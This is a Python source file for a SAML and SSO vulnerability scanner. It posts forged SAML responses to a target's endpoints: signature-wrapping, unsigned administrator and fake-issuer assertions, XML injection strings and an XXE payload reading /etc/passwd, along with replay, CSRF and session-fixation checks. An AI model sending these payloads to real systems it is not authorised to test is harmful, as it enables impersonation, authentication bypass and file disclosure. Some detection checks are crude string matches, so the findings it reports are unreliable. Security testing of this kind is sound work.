"""
SAML & SSO Vulnerability Scanner
=================================

Comprehensive SAML and Single Sign-On security testing
Detects all major SAML/SSO vulnerabilities

Author: AI Pentest Brain Team
Version: 1.0
"""

import requests
import base64
import zlib
from urllib.parse import unquote, quote
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional
import logging
import hashlib
import time

logger = logging.getLogger(__name__)


class SAMLSSOScanner:
    """
    SAML and SSO vulnerability scanner
    Tests for SAML-specific attack vectors
    """
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Common SAML endpoints
        self.saml_endpoints = [
            '/saml/acs',
            '/saml/sso',
            '/saml/consume',
            '/sso/saml',
            '/auth/saml',
            '/simplesaml/module.php/saml/sp/saml2-acs.php',
            '/Shibboleth.sso/SAML2/POST',
            '/saml2/acs',
            '/api/saml/acs'
        ]
        
        # Common SSO endpoints
        self.sso_endpoints = [
            '/sso',
            '/auth/sso',
            '/login/sso',
            '/oauth2/authorize',
            '/connect/authorize',
            '/.well-known/openid-configuration'
        ]
    
    def scan_all(self) -> List[Dict]:
        """Run all SAML/SSO vulnerability scans"""
        logger.info(f"Starting SAML/SSO vulnerability scan on {self.target_url}")
        
        vulnerabilities = []
        
        # Find SAML endpoints
        saml_endpoint = self._find_saml_endpoint()
        if saml_endpoint:
            logger.info(f"SAML endpoint found: {saml_endpoint}")
            vulnerabilities.extend(self._check_saml_vulnerabilities(saml_endpoint))
        
        # Check SSO endpoints
        sso_endpoint = self._find_sso_endpoint()
        if sso_endpoint:
            logger.info(f"SSO endpoint found: {sso_endpoint}")
            vulnerabilities.extend(self._check_sso_vulnerabilities(sso_endpoint))
        
        return vulnerabilities
    
    def _find_saml_endpoint(self) -> Optional[str]:
        """Find SAML endpoint"""
        for path in self.saml_endpoints:
            url = self.target_url.rstrip('/') + path
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code in [200, 302, 400, 405]:
                    # Check for SAML indicators
                    if 'saml' in response.text.lower() or 'SAMLResponse' in response.text:
                        return url
            except:
                continue
        return None
    
    def _find_sso_endpoint(self) -> Optional[str]:
        """Find SSO endpoint"""
        for path in self.sso_endpoints:
            url = self.target_url.rstrip('/') + path
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code in [200, 302]:
                    return url
            except:
                continue
        return None
    
    def _check_saml_vulnerabilities(self, endpoint: str) -> List[Dict]:
        """Check for SAML-specific vulnerabilities"""
        vulnerabilities = []
        
        vulnerabilities.extend(self._check_xml_signature_wrapping(endpoint))
        vulnerabilities.extend(self._check_assertion_replay(endpoint))
        vulnerabilities.extend(self._check_xml_injection(endpoint))
        vulnerabilities.extend(self._check_xxe_in_saml(endpoint))
        vulnerabilities.extend(self._check_missing_signature(endpoint))
        vulnerabilities.extend(self._check_recipient_validation(endpoint))
        vulnerabilities.extend(self._check_issuer_validation(endpoint))
        
        return vulnerabilities
    
    def _check_xml_signature_wrapping(self, endpoint: str) -> List[Dict]:
        """Check for XML Signature Wrapping attacks"""
        vulnerabilities = []
        
        # Create a malicious SAML assertion with wrapped signature
        malicious_saml = """<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" 
                ID="_fake_response" Version="2.0">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_real_assertion">
    <saml:Subject>
      <saml:NameID>attacker@evil.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_fake_assertion">
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:Reference URI="#_fake_assertion"/>
      </ds:SignedInfo>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>legitimate@user.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""
        
        try:
            # Encode SAML
            encoded_saml = base64.b64encode(malicious_saml.encode()).decode()
            
            # Send to endpoint
            response = self.session.post(
                endpoint,
                data={'SAMLResponse': encoded_saml},
                timeout=10
            )
            
            # Check if wrapping was successful
            if response.status_code == 200 and 'attacker@evil.com' in response.text:
                vulnerabilities.append({
                    'type': 'saml_signature_wrapping',
                    'severity': 'CRITICAL',
                    'endpoint': endpoint,
                    'description': 'SAML XML Signature Wrapping vulnerability',
                    'impact': 'Attacker can bypass signature validation and impersonate any user',
                    'evidence': 'Wrapped SAML assertion accepted',
                    'recommendation': 'Validate entire XML structure, not just signed elements',
                    'cwe': 'CWE-347: Improper Verification of Cryptographic Signature'
                })
        
        except Exception as e:
            logger.debug(f"XML signature wrapping check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_assertion_replay(self, endpoint: str) -> List[Dict]:
        """Check for SAML assertion replay attacks"""
        vulnerabilities = []
        
        # Create a simple SAML assertion
        saml_assertion = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" 
                  ID="_test_assertion_123">
    <saml:Subject>
      <saml:NameID>testuser@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""
        
        try:
            encoded_saml = base64.b64encode(saml_assertion.encode()).decode()
            
            # Send first time
            response1 = self.session.post(
                endpoint,
                data={'SAMLResponse': encoded_saml},
                timeout=10
            )
            
            # Wait and try to replay
            time.sleep(2)
            response2 = self.session.post(
                endpoint,
                data={'SAMLResponse': encoded_saml},
                timeout=10
            )
            
            # If both succeed, replay protection is missing
            if response1.status_code == 200 and response2.status_code == 200:
                if response2.text == response1.text:
                    vulnerabilities.append({
                        'type': 'saml_assertion_replay',
                        'severity': 'HIGH',
                        'endpoint': endpoint,
                        'description': 'SAML assertion replay attack possible',
                        'impact': 'Attacker can reuse captured SAML assertions',
                        'evidence': 'Same assertion accepted twice',
                        'recommendation': 'Implement assertion ID tracking and expiration checking',
                        'cwe': 'CWE-294: Authentication Bypass by Capture-replay'
                    })
        
        except Exception as e:
            logger.debug(f"Assertion replay check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_xml_injection(self, endpoint: str) -> List[Dict]:
        """Check for XML injection in SAML"""
        vulnerabilities = []
        
        # Try XML injection in NameID
        injection_payloads = [
            "admin</saml:NameID><saml:NameID>admin",
            "user'><saml:Attribute Name='Role'><saml:AttributeValue>admin",
            "</saml:Subject><saml:AuthnStatement><saml:SubjectLocality Address='evil.com'/><saml:Subject>"
        ]
        
        for payload in injection_payloads:
            saml_with_injection = f"""<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>{payload}</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""
            
            try:
                encoded_saml = base64.b64encode(saml_with_injection.encode()).decode()
                
                response = self.session.post(
                    endpoint,
                    data={'SAMLResponse': encoded_saml},
                    timeout=10
                )
                
                # Check if injection was successful
                if 'admin' in response.text or 'Role' in response.text:
                    vulnerabilities.append({
                        'type': 'saml_xml_injection',
                        'severity': 'HIGH',
                        'endpoint': endpoint,
                        'description': 'XML injection in SAML assertion',
                        'impact': 'Attacker can manipulate SAML assertion structure',
                        'evidence': f'Injection payload: {payload}',
                        'recommendation': 'Properly parse and validate XML structure',
                        'cwe': 'CWE-91: XML Injection'
                    })
                    break
            
            except Exception as e:
                logger.debug(f"XML injection check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_xxe_in_saml(self, endpoint: str) -> List[Dict]:
        """Check for XXE in SAML parsing"""
        vulnerabilities = []
        
        # Create SAML with XXE
        xxe_saml = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""
        
        try:
            encoded_saml = base64.b64encode(xxe_saml.encode()).decode()
            
            response = self.session.post(
                endpoint,
                data={'SAMLResponse': encoded_saml},
                timeout=10
            )
            
            # Check for file contents in response
            if 'root:' in response.text or '/bin/bash' in response.text:
                vulnerabilities.append({
                    'type': 'saml_xxe',
                    'severity': 'CRITICAL',
                    'endpoint': endpoint,
                    'description': 'XXE (XML External Entity) in SAML parser',
                    'impact': 'Attacker can read arbitrary files and perform SSRF',
                    'evidence': 'XXE payload executed successfully',
                    'recommendation': 'Disable external entity processing in XML parser',
                    'cwe': 'CWE-611: XML External Entity Reference'
                })
        
        except Exception as e:
            logger.debug(f"XXE in SAML check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_missing_signature(self, endpoint: str) -> List[Dict]:
        """Check if SAML assertion without signature is accepted"""
        vulnerabilities = []
        
        # Create unsigned SAML assertion
        unsigned_saml = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>unsigned_admin@example.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role">
        <saml:AttributeValue>Administrator</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>"""
        
        try:
            encoded_saml = base64.b64encode(unsigned_saml.encode()).decode()
            
            response = self.session.post(
                endpoint,
                data={'SAMLResponse': encoded_saml},
                timeout=10
            )
            
            # If unsigned assertion is accepted
            if response.status_code == 200 and 'admin' in response.text.lower():
                vulnerabilities.append({
                    'type': 'saml_missing_signature',
                    'severity': 'CRITICAL',
                    'endpoint': endpoint,
                    'description': 'SAML assertion accepted without signature',
                    'impact': 'Attacker can forge any SAML assertion',
                    'evidence': 'Unsigned SAML assertion accepted',
                    'recommendation': 'Require and validate digital signatures on all assertions',
                    'cwe': 'CWE-347: Improper Verification of Cryptographic Signature'
                })
        
        except Exception as e:
            logger.debug(f"Missing signature check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_recipient_validation(self, endpoint: str) -> List[Dict]:
        """Check if Recipient attribute is validated"""
        vulnerabilities = []
        
        # Create SAML with wrong recipient
        saml_wrong_recipient = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:SubjectConfirmation>
        <saml:SubjectConfirmationData Recipient="http://evil.com/saml/acs"/>
      </saml:SubjectConfirmation>
      <saml:NameID>testuser@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""
        
        try:
            encoded_saml = base64.b64encode(saml_wrong_recipient.encode()).decode()
            
            response = self.session.post(
                endpoint,
                data={'SAMLResponse': encoded_saml},
                timeout=10
            )
            
            # If accepted with wrong recipient
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'saml_recipient_not_validated',
                    'severity': 'HIGH',
                    'endpoint': endpoint,
                    'description': 'SAML Recipient attribute not validated',
                    'impact': 'Attacker can use assertions intended for other services',
                    'evidence': 'Assertion with wrong Recipient accepted',
                    'recommendation': 'Validate Recipient matches your service URL',
                    'cwe': 'CWE-346: Origin Validation Error'
                })
        
        except Exception as e:
            logger.debug(f"Recipient validation check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_issuer_validation(self, endpoint: str) -> List[Dict]:
        """Check if Issuer is properly validated"""
        vulnerabilities = []
        
        # Create SAML with fake issuer
        saml_fake_issuer = """<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">http://evil-idp.com</saml:Issuer>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Issuer>http://evil-idp.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID>fake_admin@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""
        
        try:
            encoded_saml = base64.b64encode(saml_fake_issuer.encode()).decode()
            
            response = self.session.post(
                endpoint,
                data={'SAMLResponse': encoded_saml},
                timeout=10
            )
            
            # If accepted with fake issuer
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'saml_issuer_not_validated',
                    'severity': 'CRITICAL',
                    'endpoint': endpoint,
                    'description': 'SAML Issuer not validated',
                    'impact': 'Attacker can impersonate any Identity Provider',
                    'evidence': 'Assertion with fake Issuer accepted',
                    'recommendation': 'Validate Issuer against whitelist of trusted IdPs',
                    'cwe': 'CWE-346: Origin Validation Error'
                })
        
        except Exception as e:
            logger.debug(f"Issuer validation check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_sso_vulnerabilities(self, endpoint: str) -> List[Dict]:
        """Check for general SSO vulnerabilities"""
        vulnerabilities = []
        
        vulnerabilities.extend(self._check_sso_csrf(endpoint))
        vulnerabilities.extend(self._check_sso_session_fixation(endpoint))
        
        return vulnerabilities
    
    def _check_sso_csrf(self, endpoint: str) -> List[Dict]:
        """Check for CSRF in SSO flow"""
        vulnerabilities = []
        
        try:
            # Try SSO without state parameter
            response = self.session.get(
                endpoint,
                params={'redirect_uri': 'http://example.com/callback'},
                timeout=10
            )
            
            # Check if state parameter is required
            if response.status_code == 200 and 'state' not in response.text.lower():
                vulnerabilities.append({
                    'type': 'sso_csrf',
                    'severity': 'HIGH',
                    'endpoint': endpoint,
                    'description': 'SSO flow missing CSRF protection',
                    'impact': 'Attacker can force users to authenticate as attacker',
                    'evidence': 'No state parameter required',
                    'recommendation': 'Implement and validate state parameter',
                    'cwe': 'CWE-352: Cross-Site Request Forgery'
                })
        
        except Exception as e:
            logger.debug(f"SSO CSRF check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_sso_session_fixation(self, endpoint: str) -> List[Dict]:
        """Check for session fixation in SSO"""
        vulnerabilities = []
        
        try:
            # Set a session cookie
            self.session.cookies.set('session_id', 'attacker_controlled_session')
            
            # Try SSO login
            response = self.session.get(endpoint, timeout=10)
            
            # Check if same session cookie is used after login
            if response.cookies.get('session_id') == 'attacker_controlled_session':
                vulnerabilities.append({
                    'type': 'sso_session_fixation',
                    'severity': 'HIGH',
                    'endpoint': endpoint,
                    'description': 'Session fixation in SSO flow',
                    'impact': 'Attacker can hijack user sessions',
                    'evidence': 'Session ID not regenerated after SSO login',
                    'recommendation': 'Regenerate session ID after successful authentication',
                    'cwe': 'CWE-384: Session Fixation'
                })
        
        except Exception as e:
            logger.debug(f"Session fixation check error: {str(e)}")
        
        return vulnerabilities


# Test function
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    
    print("="*70)
    print("SAML & SSO Vulnerability Scanner - Test")
    print("="*70 + "\n")
    
    target = "http://localhost:8080"
    scanner = SAMLSSOScanner(target)
    
    vulnerabilities = scanner.scan_all()
    
    print(f"\n[+] Found {len(vulnerabilities)} SAML/SSO vulnerabilities\n")
    
    for vuln in vulnerabilities:
        print(f"Type: {vuln['type']}")
        print(f"Severity: {vuln['severity']}")
        print(f"Description: {vuln['description']}")
        print("-" * 70)
